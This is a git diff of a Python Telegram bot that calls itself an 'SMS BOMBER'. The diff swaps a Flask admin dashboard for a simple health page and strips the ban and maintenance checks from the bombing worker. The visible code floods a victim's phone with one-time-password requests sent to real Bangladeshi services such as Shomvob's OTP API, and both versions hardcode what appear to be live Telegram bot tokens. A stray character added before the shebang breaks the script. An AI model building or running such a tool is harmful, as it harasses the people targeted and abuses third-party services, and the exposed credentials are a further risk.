@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+a#!/usr/bin/env python3
 import requests
 import time
 import os
@@ -7,7 +7,7 @@ import json
 import threading
 import atexit
 import signal
-from datetime import datetime, timedelta
+from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
@@ -17,183 +17,39 @@ warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ==================== BOT TOKEN (FIRST) ====================
-BOT_TOKEN = "8781609298:AAG82Tkv9TNn_gKynuCAwt57J2Zb99-ZJYY"
-# ============================================================
-
-# ==================== FLASK ADMIN DASHBOARD ====================
-# ==================== FIXED FLASK ADMIN ====================
-from flask import Flask, jsonify, render_template_string
-import threading
+# ==================== FLASK APP (ONLY DECLARATION, NO THREAD) ====================
+from flask import Flask
 import os
-import sys
-from datetime import datetime
 
-# Flask app
 app = Flask(__name__)
 
-# Global variables (ensure these exist before Flask uses them)
-if 'bot_stats' not in globals():
-    bot_stats = {
-        'total_users': 0,
-        'total_attacks': 0,
-        'total_messages': 0,
-        'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        'server_status': 'ONLINE'
-    }
-
-if 'bot_users' not in globals():
-    bot_users = {}
-
-if 'active_attacks' not in globals():
-    active_attacks = {}
-
-# Simple HTML template
-HTML = '''
-<!DOCTYPE html>
-<html>
-<head>
-    <title>SMS Bomber Admin</title>
-    <style>
-        body{font-family:Arial;margin:20px;background:#f0f0f0}
-        .container{max-width:800px;margin:auto;background:white;padding:20px;border-radius:10px}
-        .header{background:#667eea;color:white;padding:20px;border-radius:5px}
-        .stats{display:grid;grid-template-columns:repeat(2,1fr);gap:20px;margin:20px 0}
-        .card{background:white;padding:20px;border-radius:5px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
-        .number{font-size:36px;font-weight:bold;color:#667eea}
-        table{width:100%;border-collapse:collapse}
-        th{background:#667eea;color:white;padding:10px}
-        td{padding:10px;border-bottom:1px solid #ddd}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🔥 SMS BOMBER ADMIN</h1>
-            <p>Server Status: <strong id="status">ONLINE</strong></p>
-        </div>
-        
-        <div class="stats">
-            <div class="card">
-                <h3>Total Users</h3>
-                <div class="number" id="totalUsers">0</div>
-            </div>
-            <div class="card">
-                <h3>Total Attacks</h3>
-                <div class="number" id="totalAttacks">0</div>
-            </div>
-            <div class="card">
-                <h3>Active Now</h3>
-                <div class="number" id="activeNow">0</div>
-            </div>
-            <div class="card">
-                <h3>Uptime</h3>
-                <div class="number" id="uptime">0h</div>
-            </div>
-        </div>
-        
-        <h3>Recent Users</h3>
-        <table id="userTable">
-            <tr><th>ID</th><th>Username</th><th>Name</th><th>Attacks</th></tr>
-        </table>
-    </div>
-    
-    <script>
-    function loadData() {
-        fetch('/api/stats')
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('totalUsers').innerText = data.total_users;
-                document.getElementById('totalAttacks').innerText = data.total_attacks;
-                document.getElementById('activeNow').innerText = data.active_attacks;
-                document.getElementById('uptime').innerText = data.uptime;
-                document.getElementById('status').innerText = data.server_status;
-            });
-        
-        fetch('/api/users')
-            .then(r => r.json())
-            .then(users => {
-                let html = '<tr><th>ID</th><th>Username</th><th>Name</th><th>Attacks</th></tr>';
-                users.forEach(user => {
-                    html += `<tr>
-                        <td>${user.id}</td>
-                        <td>@${user.username || 'None'}</td>
-                        <td>${user.name}</td>
-                        <td>${user.attacks}</td>
-                    </tr>`;
-                });
-                document.getElementById('userTable').innerHTML = html;
-            });
-    }
-    
-    loadData();
-    setInterval(loadData, 5000);
-    </script>
-</body>
-</html>
-'''
-
 @app.route('/')
-def index():
-    return render_template_string(HTML)
-
-@app.route('/api/stats')
-def api_stats():
-    from datetime import datetime
-    uptime = datetime.now() - datetime.strptime(bot_stats['start_time'], "%Y-%m-%d %H:%M:%S")
-    hours = uptime.total_seconds() // 3600
-    minutes = (uptime.total_seconds() % 3600) // 60
-    
-    return jsonify({
-        'total_users': len(bot_users),
-        'total_attacks': bot_stats.get('total_attacks', 0),
-        'active_attacks': len(active_attacks),
-        'server_status': bot_stats.get('server_status', 'ONLINE'),
-        'uptime': f"{int(hours)}h {int(minutes)}m"
-    })
-
-@app.route('/api/users')
-def api_users():
-    users = []
-    for uid, data in list(bot_users.items())[:20]:
-        users.append({
-            'id': uid,
-            'username': data.get('username', ''),
-            'name': data.get('first_name', 'Unknown'),
-            'attacks': data.get('total_attacks', 0)
-        })
-    return jsonify(users)
+def home():
+    return "🔥 SMS BOMBER BOT is running on Render!"
 
 @app.route('/health')
 def health():
     return "OK", 200
+# =================================================================================
 
-# Fix port conflict - try different ports
-def run_flask():
-    ports = [10000, 8080, 5000, 8000]
-    for port in ports:
-        try:
-            print(f"Trying port {port}...")
-            app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
-            break
-        except OSError:
-            print(f"Port {port} in use, trying next...")
-            continue
-
-# Start Flask in thread
-flask_thread = threading.Thread(target=run_flask, daemon=True)
-flask_thread.start()
-print("✅ Flask Admin started (trying ports 10000,8080,5000,8000)")
-# ==================== END FLASK ====================
-# ==================== END FLASK ====================
-
-# Bot configuration (already defined above)
-# BOT_TOKEN already defined at the top
+# Bot configuration
+BOT_TOKEN = "8781609298:AAG6GxsYKPdFZkkyFYxaDhOBFeHO7PcnRls"
 
 # File paths for data storage
 USERS_FILE = "bot_users.json"
 STATS_FILE = "bot_stats.json"
 LOG_FILE = "bot_activity.log"
+
+# Global variables
+active_attacks = {}
+bot_users = {}
+bot_stats = {
+    'total_users': 0,
+    'total_attacks': 0,
+    'total_messages': 0,
+    'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    'server_status': 'ONLINE'
+}
 
 # Server shutdown flag
 server_is_shutting_down = False
@@ -242,7 +98,7 @@ def clear_screen():
     print("          🔥 SMS BOMBER SERVER 🔥")
     print("          Developed by Mr.MorningStar")
     print("="*60)
-    print(f"  Server Status: {bot_stats['server_status']}")
+    print(f"  Server Status: ONLINE")
     print(f"  Start Time: {bot_stats['start_time']}")
     print("="*60)
     print("")
@@ -399,30 +255,7 @@ def track_user(user_id, username, first_name):
         save_data()
 
 def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, username):
-    """Run bombing with all sites"""
-    # Check if user is banned
-    if str(user_id) in banned_users:
-        try:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                'chat_id': chat_id,
-                'text': "⛔ **You are banned from using this bot!**"
-            })
-        except:
-            pass
-        return
-    
-    # Check server status
-    if bot_stats['server_status'] == 'OFFLINE':
-        try:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
-                'chat_id': chat_id,
-                'text': MAINTENANCE_MESSAGE,
-                'parse_mode': 'Markdown'
-            })
-        except:
-            pass
-        return
-    
+    """Run bombing with all sites - exactly like your original working script"""
     session = requests.Session()
     cycle_num = 0
     success = 0
@@ -1481,7 +1314,9 @@ def bombing_worker(chat_id, full_number, clean_number, raw_number, user_id, user
                     'chat_id': chat_id,
                     'text': "[Sundarban] ✗ Failed"
                 })
-            
+
+
+
             # Shomvob
             try:
                 url_shomvob = "https://backend-api.shomvob.co/api/v2/otp/phone"
